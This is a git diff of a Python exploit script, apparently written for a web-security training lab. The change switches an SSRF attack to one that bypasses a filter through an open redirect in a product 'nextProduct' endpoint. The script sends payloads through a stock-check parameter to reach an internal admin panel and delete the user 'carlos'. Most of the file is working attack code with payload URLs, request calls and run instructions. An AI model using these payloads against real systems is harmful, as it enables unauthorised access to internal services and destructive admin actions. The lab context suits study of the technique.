@@ -1,7 +1,8 @@
-#our reconasense info is  
-#localhost_URL = http://localhost/
-#admin_URL = http://localhost/admin
-#carlos_deletetion_Url = http://localhost/admin/delete?username=carlos
+##our reconasense info is  
+#CheckStore feature vurnable to open redirect vurnabillity
+#path to delete a user is "/product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080/admin/delete?username=carlos" #SSRF payload request library will encode it once so we do not have to perform double URL encodind 
+#path of admin interface is /product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080/admin/
+
 import requests
 import sys
 import urllib3
@@ -15,7 +16,7 @@ proxies ={'http' : 'http://127.0.0.1:8080' ,'https':'http://127.0.0.1:8080'}
 
 def delete_user(url):
     #ssrf payload
-    delete_user_url="http://localhost/admin/delete?username=carlos" #SSRF payload
+    delete_user_url="/product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080/admin/delete?username=carlos" #SSRF payload request library will encode it once so we do not have to perform double URL encodind 
     check_stock_path="/product/stock"
     params_deletion={'stockApi':delete_user_url}
     #sending request to delete the user
@@ -23,7 +24,7 @@ def delete_user(url):
     ,verify=False, proxies=proxies )
     #now the user is deleted
     # we need to check if it is actully deleted
-    admin_interface='http://localhost/admin'
+    admin_interface='/product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080/admin/'
     params_checking={'stockApi':admin_interface}
     req=requests.post(url +check_stock_path ,data=params_checking
     ,verify=False, proxies=proxies )
@@ -56,4 +57,4 @@ if __name__ == "__main__":
     
 #to run this code
 #write in terminal
-#python3 1SSRF_against_local_server.py "Url of the lab"   
+#python3 4-SSRF_with_filter_bypass_via_open_redirection.py "Url of the lab"   
